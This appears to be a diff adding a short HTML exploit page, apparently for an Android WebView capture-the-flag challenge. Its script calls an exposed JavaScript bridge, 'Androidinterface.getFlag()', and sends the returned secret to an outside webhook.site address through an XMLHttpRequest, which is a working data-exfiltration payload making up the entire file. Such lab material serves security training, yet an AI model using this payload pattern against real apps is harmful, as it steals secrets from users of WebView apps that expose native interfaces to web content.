@@ -1,0 +1,19 @@
+<!DOCTYPE html>
+<html lang="en">
+<head></head>
+<body>
+
+    <script>
+	    try {
+    var flag = Androidinterface.getFlag();
+
+    var xhr = new XMLHttpRequest();
+    xhr.open("GET", "https://webhook.site/0c92452a-a056-4739-9bba-e79e2e3744c5?flag=" + encodeURIComponent(flag), true);
+    xhr.send();
+
+	    } catch (e) {
+    alert(e);
+	}
+</script>
+</body>
+</html>
